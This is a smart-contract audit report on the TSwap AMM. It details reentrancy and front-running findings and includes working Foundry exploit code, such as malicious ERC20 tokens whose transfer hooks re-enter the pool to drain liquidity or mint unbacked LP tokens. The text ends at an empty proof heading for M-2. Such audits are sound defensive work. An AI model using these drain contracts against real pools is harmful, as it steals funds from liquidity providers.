# 5 t swap audit - Findings Report
## Commit hash: 55d1e086ed0917fd055b14f63099c2342eb6b86a

## Protocol Overview 

**TSwap Protocol Overview**

TSwap is a minimal Uniswap-v1 style AMM composed of a `PoolFactory` and many `TSwapPool` contracts. The factory stores the canonical WETH address and lets anyone deploy a new pool for any ERC-20 token. Each pool is an ERC20 itself, representing LP shares.

### Liquidity
Liquidity providers deposit proportional amounts of WETH and the chosen token; deposits must exceed a small WETH minimum. The pool mints LP tokens equal to the depositor’s share of total reserves. Holders can later burn LP tokens to withdraw their proportional reserves, supplying minimum-received safeguards.

### Swapping
Pools keep the constant-product invariant `x * y = k` with a 0.3 % fee (implemented via a 997/1000 multiplier). Users have two swap methods:
- **swapExactInput** – send an exact input amount and receive at least a specified minimum output.
- **swapExactOutput** – request an exact output amount and pay no more than the quoted input maximum.

### Utilities & Safety
View functions expose spot prices, required inputs/outputs, and pool reserves. Modifiers protect against zero amounts, invalid tokens, and expired deadlines. There are no admin keys—creation, liquidity, and trading are fully permissionless.
## High Risk Findings
[H-1]. Reentrancy issue in TSwapPool::_swap
[H-2]. Reentrancy issue in TSwapPool::deposit
[H-3]. Reentrancy issue in TSwapPool::_addLiquidityMintAndTransfer
[H-4]. Frontrun/Backrun/Sandwhich MEV issue in PoolFactory::createPool
## Medium Risk Findings
[M-1]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::_swap
[M-2]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::sellPoolTokens
[M-3]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::swapExactOutput
[M-4]. Reentrancy issue in PoolFactory::createPool
[M-5]. DOS issue in PoolFactory::createPool
## Low Risk Findings
[L-1]. Event Consistency issue in TSwapPool::_addLiquidityMintAndTransfer
[L-2]. Integer Overflow issue in TSwapPool::getOutputAmountBasedOnInput
[L-3]. Zero Code issue in TSwapPool::constructor
[L-4]. Unexpected Eth issue in PoolFactory::NA
[L-5]. Zero Code issue in PoolFactory::createPool
[L-6]. DOS issue in PoolFactory::createPool
## Info Risk Findings
[I-1]. DOS issue in TSwapPool::sellPoolTokens


### Number of Findings
- H: 4
- M: 5
- L: 6
- I: 1



# High Risk Findings

## [H-1]. Reentrancy issue in TSwapPool::_swap

## Description
The `_swap` function violates the Checks-Effects-Interactions pattern. When `swap_count` reaches `SWAP_COUNT_MAX` (10), it resets the counter and then immediately makes an external call to `outputToken.safeTransfer` to send a bonus. This external call occurs before the main token transfers for the swap are executed. If `outputToken` is a malicious token contract (e.g., an ERC777 or a custom ERC20 with a transfer hook), it can re-enter the `TSwapPool` contract. Because the outer swap has not yet pulled the `inputToken` from the user, the re-entrant call can perform another swap using the same funds, breaking the pool's invariant (`x*y=k`) and allowing the attacker to steal assets.

## Impact
A successful re-entrancy attack can break the core invariant of the AMM, leading to a loss of funds for liquidity providers. The attacker can manipulate the pool's state to drain value from it.

## Proof of Concept
The vulnerability is triggered when the bonus transfer executed BEFORE pulling the user’s input reaches a receiver contract that re-enters the pool. Using a malicious ERC20 that calls a hook on the *receiver* (attacker contract) allows the attacker to re-enter with the SAME funds that are still in her possession.

1.  Attacker deploys MaliciousToken (the pool token). Its `transfer` implementation executes a callback `tokensReceived()` on the `to` address whenever `to` is a contract.
2.  Attacker deploys `Attacker` contract implementing `tokensReceived()`; inside this callback it performs an additional swap while the outer swap is still in progress.
3.  Liquidity is added to the pool in the normal way.
4.  Nine harmless swaps are made so `swap_count` becomes 9.
5.  `Attacker.attack()` calls `pool.swapExactInput(WETH, 1 ether, MaliciousToken, 0, …)`. Inside `_swap` the counter reaches 10, is reset to 0, and the pool transfers 1 MAL to the attacker *before* it has pulled the 1 WETH.
6.  The `MaliciousToken.transfer` fires the callback on the attacker contract; the callback executes a second swap that uses stale reserves and gains surplus WETH.
7.  Control returns to the first swap, which completes using outdated amounts, breaking x*y=k.  Pool loses value equal to the gifted MAL plus the pricing error; attacker ends up with more WETH than she put in.

Because both tokens accepted by the pool are user-supplied (only required to equal `i_poolToken` or `i_wethToken`), nothing prevents the pool token from having this malicious behaviour.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/TSwapPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface ITokenReceiver { function tokensReceived() external; }

// Minimal ERC20 implementation for WETH
contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

// Pool token that notifies receiver after every transfer
contract MaliciousToken is ERC20 {
    constructor() ERC20("Malicious", "MAL") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }

    function _afterTokenTransfer(address, address to, uint256) internal override {
        // If receiver is a contract, give it a chance to re-enter
        if (to.code.length != 0) {
            try ITokenReceiver(to).tokensReceived() {} catch {}
        }
    }
}

// Re-entrancy attacker
contract Attacker is ITokenReceiver {
    TSwapPool public immutable pool;
    IERC20 public immutable weth;
    IERC20 public immutable mal;
    bool private reentered;

    constructor(TSwapPool _pool, IERC20 _weth, IERC20 _mal) {
        pool = _pool; weth = _weth; mal = _mal;
    }

    // Called by MaliciousToken during the bonus transfer
    function tokensReceived() external override {
        if (reentered) return;     // 1-shot re-entrancy guard
        reentered = true;
        mal.approve(address(pool), 1 ether);
        pool.swapExactInput(mal, 1 ether, weth, 0, uint64(block.timestamp));
    }

    // Entry point for the test
    function attack() external {
        weth.approve(address(pool), 1 ether);
        pool.swapExactInput(weth, 1 ether, mal, 0, uint64(block.timestamp));
    }
}

contract ReentrancyTest is Test {
    MockERC20 weth;
    MaliciousToken mal;
    TSwapPool pool;
    Attacker attacker;

    function setUp() public {
        weth = new MockERC20("WETH", "WETH");
        mal  = new MaliciousToken();
        pool = new TSwapPool(address(mal), address(weth), "LP", "LP");

        // provide initial liquidity (1000 each)
        weth.mint(address(this), 1000 ether);
        mal.mint(address(this), 1000 ether);
        weth.approve(address(pool), 1000 ether);
        mal.approve(address(pool), 1000 ether);
        pool.deposit(1000 ether, 0, 1000 ether, uint64(block.timestamp));

        // deploy attacker contract and fund it
        attacker = new Attacker(pool, weth, mal);
        weth.mint(address(attacker), 10 ether);
        mal.mint(address(attacker), 0);

        // run 9 harmless swaps so swap_count == 9
        for (uint i; i < 9; ++i) {
            pool.swapExactInput(weth, 1 ether, mal, 0, uint64(block.timestamp));
        }
    }

    function test_ReentrancyBreaksInvariant() public {
        uint256 kBefore = weth.balanceOf(address(pool)) * mal.balanceOf(address(pool));

        attacker.attack();   // performs the exploit

        uint256 kAfter  = weth.balanceOf(address(pool)) * mal.balanceOf(address(pool));
        assertLt(kAfter, kBefore, "Invariant should be broken");
    }
}


## Suggested Mitigation
Move the bonus-reward transfer *after* all other state mutations and internal accounting OR add the traditional `nonReentrant` guard. A minimal, safe change is:

function _swap(...) private nonReentrant {
    if (invalid conditions) revert;

    uint256 newCount = ++swap_count;

    // EFFECTS – pull tokens & update pool balances first
    inputToken.safeTransferFrom(msg.sender, address(this), inputAmount);
    outputToken.safeTransfer(msg.sender, outputAmount);

    // INTERACTION – bonus transfer after internal state is final
    if (newCount >= SWAP_COUNT_MAX) {
        swap_count = 0;
        outputToken.safeTransfer(msg.sender, 1 ether);
    }
}

Alternatively, remove the bonus feature altogether or restrict `i_poolToken` and `i_wethToken` to audited, non-reentrant implementations.

## [H-2]. Reentrancy issue in TSwapPool::deposit

## Description
The `deposit`, `withdraw`, and `swap` functions perform external token transfers (`safeTransferFrom`, `safeTransfer`) after updating internal state (`_mint`, `_burn`, `swap_count++`). While this follows the Checks-Effects-Interactions pattern, it does not prevent reentrancy attacks if a malicious ERC777-compliant token is used. ERC777 tokens have hooks (`tokensToSend` / `tokensReceived`) that can call back into the contract before the external call completes. This allows an attacker to re-enter a function with inconsistent state, potentially minting more LP tokens than deserved or draining funds from the pool. For example, in `deposit`, a re-entrant call would observe an updated `totalSupply` of LP tokens but stale token reserve balances, leading to an incorrect calculation for newly minted LP tokens.

## Impact
A malicious actor could use a crafted ERC777-like token to re-enter the pool's functions, leading to the minting of unbacked LP tokens and the eventual draining of the pool's assets. This would result in a complete loss of funds for legitimate liquidity providers.

## Proof of Concept
A malicious ERC20 (or ERC777) used as the WETH leg can call back into the pool while `deposit()` is still executing. Because `_addLiquidityMintAndTransfer()` mints LP tokens **before** the pool actually receives the tokens, the first `deposit()` has already increased `totalSupply` but `wethReserves` is still unchanged.  

1. Attacker owns 1 WETH and deploys `MaliciousWETH`, overriding `transferFrom`.
2. Pool currently holds 10 WETH / 10 PT with 10 LP outstanding.
3. Attacker calls `deposit(1 WETH)`.
4. `_mint(attacker,1)` executes → totalSupply = 11.
5. Pool executes `safeTransferFrom` on the malicious token.
6. Inside `MaliciousWETH.transferFrom`, before the actual transfer is performed, it calls back `pool.deposit(1 WETH)` again.
   • `totalSupply` is 11, while `wethReserves` is still 10.
   • LP to mint = 1 * 11 / 10 = 1.1.
7. Both transfers finally settle, reserves become 12 WETH, but attacker owns 2.1 LP instead of the fair 2.0 LP.
8. Attacker can immediately withdraw to gain the extra 0.1 WETH profit (and can loop for larger profit).

The attack works because state-change (mint) precedes the external call, enabling re-entrancy with inconsistent state.

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/TSwapPool.sol";

// ─────────────────────────── Helper tokens ───────────────────────────
contract MintableERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MaliciousWETH is MintableERC20 {
    address public pool;
    bool internal inAttack;
    constructor() MintableERC20("Malicious WETH", "mWETH") {}
    function setPool(address p) external { pool = p; }

    // Re-enter when the pool pulls tokens from the attacker
    function transferFrom(address from, address to, uint256 amount)
        public override returns (bool)
    {
        if (!inAttack && msg.sender == pool && to == pool) {
            inAttack = true;
            TSwapPool(pool).deposit(
                amount,
                0,
                type(uint256).max,
                uint64(block.timestamp)
            );
            inAttack = false;
        }
        return super.transferFrom(from, to, amount);
    }
}

// ─────────────────────────────── Test ────────────────────────────────
contract ReentrancyDepositTest is Test {
    TSwapPool pool;
    MaliciousWETH weth;
    MintableERC20 pt;

    address lp = vm.addr(1);
    address attacker = vm.addr(2);

    function setUp() public {
        weth = new MaliciousWETH();
        pt   = new MintableERC20("Pool Token", "PT");
        pool = new TSwapPool(address(pt), address(weth), "LP", "LP");
        weth.setPool(address(pool));

        // seed pool with initial liquidity: 10 WETH / 10 PT
        weth.mint(lp, 10 ether);
        pt.mint(lp, 10 ether);
        vm.startPrank(lp);
        weth.approve(address(pool), type(uint256).max);
        pt.approve(address(pool), type(uint256).max);
        pool.deposit(10 ether, 0, 10 ether, uint64(block.timestamp));
        vm.stopPrank();

        // fund attacker
        weth.mint(attacker, 2 ether);
        pt.mint(attacker, 2 ether);
    }

    function testAttack() public {
        vm.startPrank(attacker);
        weth.approve(address(pool), type(uint256).max);
        pt.approve(address(pool), type(uint256).max);

        // single call triggers nested call via malicious token
        pool.deposit(1 ether, 0, type(uint256).max, uint64(block.timestamp));

        uint256 lpGained = pool.balanceOf(attacker);
        // honest user would have ~2 LP; attacker should receive >2 LP
        assertGt(lpGained, 2 ether);
        vm.stopPrank();
    }
}

## Suggested Mitigation
Apply a re-entrancy guard to all public/external functions that involve external calls and state changes. OpenZeppelin's `ReentrancyGuard` is a standard and secure implementation. Add the `nonReentrant` modifier to functions like `deposit`, `withdraw`, and the `swap` functions.

```solidity
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract TSwapPool is ERC20, ReentrancyGuard {
    // ...

    function deposit(
        uint256 wethToDeposit,
        uint256 minimumLiquidityTokensToMint,
        uint256 maximumPoolTokensToDeposit,
        uint64 deadline
    )
        external
        nonReentrant // Add modifier
        revertIfZero(wethToDeposit)
        returns (uint256 liquidityTokensToMint)
    {
        // ...
    }

    function withdraw(
        uint256 liquidityTokensToBurn,
        uint256 minWethToWithdraw,
        uint256 minPoolTokensToWithdraw,
        uint64 deadline
    )
        external
        nonReentrant // Add modifier
        revertIfDeadlinePassed(deadline)
        revertIfZero(liquidityTokensToBurn)
        revertIfZero(minWethToWithdraw)
        revertIfZero(minPoolTokensToWithdraw)
    {
        // ...
    }

    function swapExactInput(
        IERC20 inputToken,
        uint256 inputAmount,
        IERC20 outputToken,
        uint256 minOutputAmount,
        uint64 deadline
    )
        public
        nonReentrant // Add modifier
        revertIfZero(inputAmount)
        revertIfDeadlinePassed(deadline)
        returns (uint256 output)
    {
        // ...
    }

     function swapExactOutput(
        IERC20 inputToken,
        IERC20 outputToken,
        uint256 outputAmount,
        uint64 deadline
    )
        public
        nonReentrant // Add modifier
        revertIfZero(outputAmount)
        revertIfDeadlinePassed(deadline)
        returns (uint256 inputAmount)
    {
        // ...
    }

}
```

## [H-3]. Reentrancy issue in TSwapPool::_addLiquidityMintAndTransfer

## Description
The contract is vulnerable to reentrancy attacks due to not strictly following the Checks-Effects-Interactions pattern, combined with interactions with potentially untrusted ERC20 tokens (including ERC777). In functions like `_addLiquidityMintAndTransfer` and `withdraw`, state changes (minting/burning LP tokens) are performed before all external calls (token transfers) are completed. A malicious token contract could use a callback (e.g., in `transferFrom`) to re-enter the pool's functions. In the re-entrant call, the contract's logic would operate on an inconsistent state (e.g., `totalSupply` updated but token reserves not yet updated), which could be exploited to mint an unfair amount of LP tokens or disrupt pool logic.

Vulnerable Code in `_addLiquidityMintAndTransfer`:
```solidity
function _addLiquidityMintAndTransfer(
    uint256 wethToDeposit,
    uint256 poolTokensToDeposit,
    uint256 liquidityTokensToMint
) private {
    _mint(msg.sender, liquidityTokensToMint); // <- Effect (State change)
    emit LiquidityAdded(msg.sender, poolTokensToDeposit, wethToDeposit);

    // Interactions
    i_wethToken.safeTransferFrom(msg.sender, address(this), wethToDeposit);
    i_poolToken.safeTransferFrom( // <- Interaction with potential re-entrancy hook
        msg.sender,
        address(this),
        poolTokensToDeposit
    );
}
```
In this sequence, `_mint` updates the LP token supply before the underlying assets are transferred into the pool. If `i_poolToken` is a malicious contract, its `safeTransferFrom` can call back into `deposit`, which would then calculate liquidity based on an inflated LP supply but stale reserve balances, breaking the pool's core invariant.

## Impact
Because LP tokens are minted before the attacker’s ERC20 transfers succeed, a re-entrant callback can immediately call `withdraw` and burn those freshly minted (but still unbacked) LP tokens. The withdrawal is executed against the *old* reserves (which still hold other users’ funds), so the attacker receives a proportional share of the pool without ever transferring the promised assets. In the worst case the attacker can repeat the attack until the pool is emptied, stealing all underlying WETH and pool tokens from honest liquidity providers.

## Proof of Concept
1. Honest LP deposits liquidity so the pool holds 1 000 WETH and 1 000 POOL and has 1 000 LP tokens issued.
2. Attacker controls a malicious ERC20 (MAL) that will re-enter on `transferFrom`.
3. Attacker funds MAL contract with a small amount of WETH (e.g. 1 000 000 000 wei – the minimum) and an unlimited amount of MAL tokens, then calls `MAL.attack()` (see test below).
4. `TSwapPool.deposit` is entered by MAL contract; it mints roughly `(1e9 * 1000) / 1000 = 1e9` LP tokens to the MAL contract **before** any tokens are moved.
5. `TSwapPool` now executes `i_poolToken.safeTransferFrom`. During `MAL.transferFrom` the re-entrancy hook triggers `pool.withdraw` with the freshly minted 1e9 LP tokens and minimal output limits.
6. `withdraw` burns the 1e9 LP tokens and immediately transfers ≈1 000 000 000 / (1 000 +1 000 000 000) ≈ ~all existing WETH and POOL in the pool to the attacker (because reserves are still the original 1 000/1 000 but totalSupply has been temporarily inflated).
7. Control returns to the first `deposit` call, which now finishes and finally transfers the attacker’s tiny WETH + MAL deposit—far less than what has just been stolen.
8. Net result: the attacker deposits almost nothing but removes almost the entire liquidity of the pool.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Simple ERC20 with public mint
contract MockToken is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

// Malicious token used *as* the pool token and also as the attacker account
contract MaliciousToken is ERC20 {
    TSwapPool public pool;
    MockToken public weth;
    bool internal hasReentered;

    constructor() ERC20("MAL", "MAL") {}

    function setPool(address _pool, address _weth) external {
        pool = TSwapPool(_pool);
        weth = MockToken(_weth);
    }

    // Re-entrancy hook
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        // normal transfer first (so allowance checks pass)
        _transfer(from, to, amount);

        // Only re-enter once, and only when called by the pool
        if (!hasReentered && msg.sender == address(pool)) {
            hasReentered = true;
            uint256 lp = pool.balanceOf(address(this));
            // burn all freshly minted LP tokens and drain pool
            pool.withdraw(lp, 1, 1, uint64(block.timestamp));
        }
        return true;
    }

    // External function that kicks off the exploit
    function attack(uint256 wethToDeposit) external {
        // approve pool to pull tokens
        approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
        pool.deposit(wethToDeposit, 1, wethToDeposit, uint64(block.timestamp));
    }
}

contract ReentrancyDrainTest is Test {
    MockToken weth;
    MaliciousToken mal;
    TSwapPool pool;
    address honestLP = address(2);

    function setUp() public {
        weth = new MockToken("WETH", "WETH");
        mal  = new MaliciousToken();
        pool = new TSwapPool(address(mal), address(weth), "LP", "LP");
        mal.setPool(address(pool), address(weth));

        // fund honest LP and malicious token
        weth.mint(honestLP, 1_000 ether);
        mal.mint(honestLP, 1_000 ether);

        // honest LP provides liquidity
        vm.startPrank(honestLP);
        weth.approve(address(pool), type(uint256).max);
        mal.approve(address(pool), type(uint256).max);
        pool.deposit(1_000 ether, 1_000 ether, 1_000 ether, uint64(block.timestamp));
        vm.stopPrank();

        // give attacker minimal funds
        weth.mint(address(mal), 1_000_000_000); // == MINIMUM_WETH_LIQUIDITY
        mal.mint(address(mal), 1 ether);
    }

    function testDrain() public {
        uint256 poolWethBefore = weth.balanceOf(address(pool));
        uint256 attackerWethBefore = weth.balanceOf(address(mal));

        // execute attack (single tx)
        mal.attack(1_000_000_000);

        uint256 poolWethAfter = weth.balanceOf(address(pool));
        uint256 attackerWethAfter = weth.balanceOf(address(mal));

        assertGt(attackerWethAfter, attackerWethBefore, "attacker gained WETH");
        assertLt(poolWethAfter, poolWethBefore, "pool lost WETH");
    }
}

## Suggested Mitigation
Move the `_mint` operation *after* both `safeTransferFrom` calls succeed, and similarly move `_burn` operations *after* outgoing transfers in `withdraw`. Additionally, protect all externally callable state-changing functions with `nonReentrant` from OpenZeppelin’s `ReentrancyGuard` to cover other pathways.

## [H-4]. Frontrun/Backrun/Sandwhich MEV issue in PoolFactory::createPool

## Description
The `createPool` function is vulnerable to front-running. An attacker can observe a legitimate user's `createPool` transaction in the mempool, copy it with a higher gas fee to create the pool first, and then immediately add a small amount of liquidity with a skewed price ratio (e.g., 1 wei of WETH for 1,000,000 tokens). When the victim, assuming their transaction failed and the pool was created by someone else, proceeds to add their substantial liquidity, they will do so at the artificially manipulated price. This results in the victim receiving far fewer LP tokens than their capital contribution warrants, allowing the attacker and arbitrageurs to extract significant value at the victim's expense.

## Impact
Direct financial loss for initial liquidity providers. An attacker can steal a significant portion of the value of the initial liquidity deposited into a new pool, undermining trust in the permissionless creation of new markets on the platform.

## Proof of Concept
1. Alice (victim) prepares `createPool(MY_TOKEN)` and intends to seed it with 10 WETH and 10 000 MY_TOKEN.
2. Bob (attacker) spots Alice’s tx in the mempool and front-runs it with the same `createPool` call.
3. Immediately after his pool is created, Bob calls `deposit(1 gwei, 0, 1 000 000 MY_TOKEN, deadline)` – 1 gwei is the hard-coded MINIMUM_WETH_LIQUIDITY so the tx succeeds and fixes the initial price at ≈1 000 000 MY_TOKEN / gwei.
4. Alice’s `createPool` reverts (pool already exists). She then adds her intended liquidity, supplying 10 WETH and 10 000 MY_TOKEN while setting `maximumPoolTokensToDeposit = 10 000 MY_TOKEN`.
5. Because the pool’s reserve ratio is extremely skewed, Alice’s deposit uses the token-limited branch of the minting formula; she receives far fewer LP tokens than the 10 WETH she supplied should grant.
6. Bob now owns the majority of LP tokens even though he contributed only 1 gwei of WETH. He (or an arbitrage bot) can immediately burn those LP tokens or trade against the pool to extract value, leaving Alice with a loss.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PoolFactory} from "../../src/PoolFactory.sol";
import {TSwapPool} from "../../src/TSwapPool.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {DeployTSwap} from "../../script/DeployTSwap.s.sol";

contract PoolFactoryFrontrunTest is Test {
    PoolFactory poolFactory;
    MockERC20 weth;
    MockERC20 myToken;

    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    uint256 constant ONE_GWEI = 1_000_000_000; // == MINIMUM_WETH_LIQUIDITY

    function setUp() public {
        DeployTSwap deployer = new DeployTSwap();
        (poolFactory, weth) = deployer.run();
        myToken = new MockERC20("MyToken", "MTK", 1_000_000 * 1e18);
    }

    function test_FrontRun_createPool() public {
        // attacker front-runs pool creation
        vm.prank(attacker);
        address poolAddr = poolFactory.createPool(address(myToken));
        TSwapPool pool = TSwapPool(poolAddr);

        // attacker seeds pool with the absolute minimum WETH but a huge amount of MY_TOKEN
        uint256 atkWeth = ONE_GWEI;              // meets MINIMUM_WETH_LIQUIDITY
        uint256 atkTok = 1_000_000 * 1e18;      // 1 000 000 MTK

        weth.mint(attacker, atkWeth);
        myToken.mint(attacker, atkTok);

        vm.startPrank(attacker);
        weth.approve(poolAddr, atkWeth);
        myToken.approve(poolAddr, atkTok);
        pool.deposit(atkWeth, 0, atkTok, uint64(block.timestamp + 1 days));
        vm.stopPrank();

        // victim now adds what she planned
        uint256 vicWeth = 10 ether;
        uint256 vicTok = 10_000 * 1e18;

        weth.mint(victim, vicWeth);
        myToken.mint(victim, vicTok);

        vm.startPrank(victim);
        weth.approve(poolAddr, vicWeth);
        myToken.approve(poolAddr, vicTok);
        pool.deposit(vicWeth, 0, vicTok, uint64(block.timestamp + 1 days));
        vm.stopPrank();

        // Assertions — attacker owns a disproportionate share of LP tokens
        uint256 attackerLP = pool.balanceOf(attacker);
        uint256 victimLP   = pool.balanceOf(victim);

        // Attacker supplied 1 gwei vs. victim 10 ETH (~1e10 ratio), yet has a sizeable LP share.
        // Expect attackerLP to be > 1% of victimLP (should be ~sqrt price manipulation).
        assertTrue(attackerLP * 100 > victimLP, "attacker captured significant LP share");
    }
}


## Suggested Mitigation
Combine pool creation and initial liquidity provision into a single, atomic function. This ensures the transaction creator is also the one who sets the initial price, preventing a front-runner from intervening.

```solidity
// In PoolFactory.sol

// It is recommended to use a library for token transfers for safety, like Solmate's SafeTransferLib.
import { SafeTransferLib } from "solmate/utils/SafeTransferLib.sol";

// ...

function createPoolAndAddLiquidity(
    address tokenAddress,
    uint256 wethToDeposit,
    uint256 poolTokensToDeposit,
    uint64 deadline
) external returns (address poolAddress) {
    if (s_pools[tokenAddress] != address(0)) {
        revert PoolFactory__PoolAlreadyExists(tokenAddress);
    }
    
    // Using a placeholder prevents reentrancy on name/symbol calls
    s_pools[tokenAddress] = address(1);

    string memory liquidityTokenName = string.concat("T-Swap ", IERC20(tokenAddress).name());
    string memory liquidityTokenSymbol = string.concat("ts", IERC20(tokenAddress).name());
    
    TSwapPool tPool = new TSwapPool(tokenAddress, i_wethToken, liquidityTokenName, liquidityTokenSymbol);
    poolAddress = address(tPool);
    
    s_pools[tokenAddress] = poolAddress;
    s_tokens[poolAddress] = tokenAddress;

    // Atomically call deposit on the new pool
    if (wethToDeposit > 0 && poolTokensToDeposit > 0) {
        // This requires TSwapPool to handle initial deposits correctly.
        // This PoC assumes `deposit` can be called from the factory.
        // The user must first approve the factory or this function must take tokens.
        // A better design might be to have this function pull tokens.
        SafeTransferLib.safeTransferFrom(i_wethToken, msg.sender, poolAddress, wethToDeposit);
        SafeTransferLib.safeTransferFrom(tokenAddress, msg.sender, poolAddress, poolTokensToDeposit);
        tPool.deposit(wethToDeposit, 0, poolTokensToDeposit, deadline);
    }
    
    emit PoolCreated(tokenAddress, poolAddress);
}
```



# Medium Risk Findings

## [M-1]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::_swap

## Description
The `_swap` function includes a bonus mechanism where the user performing the 10th swap (`swap_count >= SWAP_COUNT_MAX`) receives an extra token. This mechanism is vulnerable to front-running (MEV). An attacker monitoring the mempool can see a legitimate user's transaction that is about to become the 10th swap. The attacker can then submit their own small swap with a higher gas fee to get their transaction mined first, thereby claiming the bonus for themselves and resetting the `swap_count` to zero. The legitimate user's swap will then execute but will not receive the bonus.

## Impact
This vulnerability allows attackers to systematically steal swap bonuses from regular users. While the direct financial loss of a single bonus may be small, it undermines the fairness of the protocol and creates a parasitic MEV opportunity that extracts value from the user base.

## Proof of Concept
1. The `swap_count` in the pool is currently 9.
2. A regular user, Bob, submits a swap transaction. He expects to be the 10th swapper and receive the bonus.
3. An attacker, Eve, sees Bob's transaction in the mempool.
4. Eve immediately creates her own swap transaction for a minimal amount (e.g., 1 wei of a token) and pays a higher gas fee than Bob.
5. Due to the higher gas fee, Eve's transaction is included in the block before Bob's.
6. Eve's swap executes, incrementing `swap_count` to 10. She receives the bonus, and `swap_count` is reset to 0.
7. Bob's transaction is then executed. It increments `swap_count` from 0 to 1. Bob does not receive any bonus.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MevBonusTest is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 token;

    address lp   = address(1);
    address bob  = address(2);
    address eve  = address(3);

    function setUp() public {
        weth  = new MockERC20("WETH", "WETH");
        token = new MockERC20("POOL", "PT");
        pool  = new TSwapPool(address(token), address(weth), "LP", "LP");

        // Provide initial liquidity
        weth.mint(lp,   100 ether);
        token.mint(lp,  100 ether);

        vm.startPrank(lp);
        weth.approve(address(pool),  type(uint256).max);
        token.approve(address(pool), type(uint256).max);
        pool.deposit(10 ether, 10 ether, 10 ether, uint64(block.timestamp));
        vm.stopPrank();

        // Fund users
        weth.mint(bob, 10 ether);
        weth.mint(eve, 10 ether);
        vm.prank(bob); weth.approve(address(pool), type(uint256).max);
        vm.prank(eve); weth.approve(address(pool), type(uint256).max);

        // Bring swap_count to 9
        for (uint256 i; i < 9; ++i) {
            vm.prank(lp);
            pool.swapExactInput(IERC20(weth), 1 ether, IERC20(token), 0, uint64(block.timestamp));
        }
    }

    function testFrontrunGetsBonus() public {
        uint256 eveBefore = token.balanceOf(eve);
        uint256 bobBefore = token.balanceOf(bob);

        // Eve front-runs with higher gas price (simulated by being called first)
        vm.prank(eve);
        pool.swapExactInput(IERC20(weth), 1, IERC20(token), 0, uint64(block.timestamp));

        // Bob’s tx (original 10-th swap) arrives second
        vm.prank(bob);
        pool.swapExactInput(IERC20(weth), 1 ether, IERC20(token), 0, uint64(block.timestamp));

        uint256 eveDelta = token.balanceOf(eve) - eveBefore;
        uint256 bobDelta = token.balanceOf(bob) - bobBefore;

        // Eve should have at least 1 token extra (the bonus)
        assertGt(eveDelta, 1 ether);
        // Bob receives no bonus
        assertLt(bobDelta, 1 ether);
    }
}

## Suggested Mitigation
Predictable, on-chain reward mechanisms are often vulnerable to front-running. The bonus mechanism should be redesigned or removed. A better approach would be to accrue the value of the bonus within the pool, benefiting all liquidity providers, rather than awarding it to a single transactional user. If a user-specific bonus is desired, it should be based on unpredictable criteria or use a commit-reveal scheme, though this adds significant complexity. The simplest and most secure mitigation is to remove the bonus mechanism entirely.

```solidity
// In _swap function

// swap_count++; // Remove
// if (swap_count >= SWAP_COUNT_MAX) { // Remove
//     swap_count = 0; // Remove
//     outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000); // Remove
// } // Remove

emit Swap(
    msg.sender,
    inputToken,
    inputAmount,
    outputToken,
    outputAmount
);

inputToken.safeTransferFrom(msg.sender, address(this), inputAmount);
outputToken.safeTransfer(msg.sender, outputAmount);
```

## [M-2]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::sellPoolTokens

## Description
The `sellPoolTokens` function is a wrapper around `swapExactOutput` that is highly vulnerable to front-running and sandwich attacks. It hardcodes the deadline to `block.timestamp` and does not provide any mechanism for the user to set slippage protection (e.g., a `maxInputAmount` parameter). An MEV bot can see a call to this function in the mempool, manipulate the pool's price to the user's disadvantage, and then reverse the manipulation for a risk-free profit, causing the user to receive a much worse exchange rate. The function name and parameter names are also misleading, further increasing the risk of misuse. The parameter `poolTokenAmount` is used as the `outputAmount` of WETH to receive, not the amount of pool tokens to sell.

## Impact
Because the wrapper passes a user-supplied value as the desired WETH output without any `maxInputAmount` parameter, every call to `sellPoolTokens` can be sandwiched. An MEV bot can widen the price just before the victim transaction so that the victim overpays in PoolTokens. The loss is limited to the victim’s balance/allowance and does not jeopardise pool reserves, but users calling the function with large approvals can lose a substantial portion of their funds.

## Proof of Concept
1. The victim wants to receive 10 WETH and calls `sellPoolTokens(10 ether)`. This transaction enters the mempool.
2. An attacker (MEV bot) sees this transaction.
3. The attacker front-runs the victim by executing a large swap of `i_poolToken` for `i_wethToken`. This depletes the WETH reserves and increases the `i_poolToken` reserves, making WETH more expensive.
4. The victim's transaction is executed. Because WETH is now more expensive, the `getInputAmountBasedOnOutput` calculation results in a much higher required `inputAmount` of `i_poolToken`. The victim pays this higher amount.
5. The attacker back-runs the victim by swapping the WETH back for `i_poolToken`. Since they are selling WETH at a higher price than they bought it for, they make a profit in `i_poolToken` at the victim's expense.

## Proof of Code
